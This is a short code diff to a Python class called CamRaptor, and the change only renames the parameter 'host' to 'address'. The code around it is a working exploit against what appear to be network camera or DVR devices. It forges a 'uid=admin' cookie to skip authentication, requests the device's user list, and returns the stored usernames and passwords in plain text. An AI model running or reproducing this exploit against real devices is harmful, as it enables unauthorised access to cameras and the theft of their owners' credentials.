@@ -30,13 +30,13 @@ import requests
 
 class CamRaptor:
     @staticmethod
-    def exploit(host):
+    def exploit(address):
         try:
             cookies = {
                 "uid": "admin"
             }
 
-            response = requests.get(f"http://{host}/device.rsp?opt=user&cmd=list", cookies=cookies, verify=False, timeout=3)
+            response = requests.get(f"http://{address}/device.rsp?opt=user&cmd=list", cookies=cookies, verify=False, timeout=3)
         except Exception:
             return None
 
@@ -49,4 +49,4 @@ class CamRaptor:
             for data in json_data["list"]:
                 username = data["uid"]
                 password = data["pwd"]
-            return f"({host}) - {username}:{password}"
+            return f"({address}) - {username}:{password}"
